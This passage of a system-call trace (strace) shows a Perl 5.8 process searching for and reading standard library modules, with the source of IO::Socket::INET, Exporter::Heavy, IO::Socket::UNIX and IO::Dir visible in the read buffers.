$multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
8423  07:23:22.860056 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.860073 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.860087 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.860100 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.860115 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.860128 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.860142 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.860155 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.860169 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.860181 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.860195 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.860208 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.860222 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.860235 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
8423  07:23:22.860257 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.860272 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.860283 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.860301 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
8423  07:23:22.861000 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
8423  07:23:22.861051 brk(0x829c000)    = 0x829c000
8423  07:23:22.861359 read(8, "", 4096) = 0
8423  07:23:22.861376 close(8)          = 0
8423  07:23:22.862512 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
8423  07:23:22.871107 _llseek(6, 6496, [6496], SEEK_SET) = 0
8423  07:23:22.871125 _llseek(6, 0, [6496], SEEK_CUR) = 0
8423  07:23:22.871223 close(6)          = 0
8423  07:23:22.871333 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.871351 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.871366 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.871379 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.871394 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.871408 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.871422 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.871435 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.871449 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.871462 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.871476 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.871490 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
8423  07:23:22.871512 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
8423  07:23:22.871528 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a6c8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.871540 _llseek(6, 0, [0], SEEK_CUR) = 0
8423  07:23:22.871556 brk(0x82bd000)    = 0x82bd000
8423  07:23:22.871573 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
8423  07:23:22.872563 _llseek(6, 1386, [1386], SEEK_SET) = 0
8423  07:23:22.872581 _llseek(6, 0, [1386], SEEK_CUR) = 0
8423  07:23:22.872592 close(6)          = 0
8423  07:23:22.872649 stat64("/etc/perl/IO/Dir.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.872664 stat64("/etc/perl/IO/Dir.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.872678 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.872691 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.872739 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.872753 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.872767 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.872793 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.872807 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.872819 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.872832 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.872845 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
8423  07:23:22.872867 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
8423  07:23:22.872881 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a6c8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.872893 _llseek(6, 0, [0], SEEK_CUR) = 0
8423  07:23:22.872913 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
8423  07:23:22.873429 stat64("/etc/perl/Tie/Hash.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.873447 stat64("/etc/perl/Tie/Hash.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.873461 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.873474 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.873489 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.873502 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.873516 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.873528 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.873541 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.873553 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.873567 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.873579 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.873593 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.873606 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
8423  07:23:22.873628 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.873642 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.873654 _llseek(8, 0, [0], SEEK_CUR) = 0
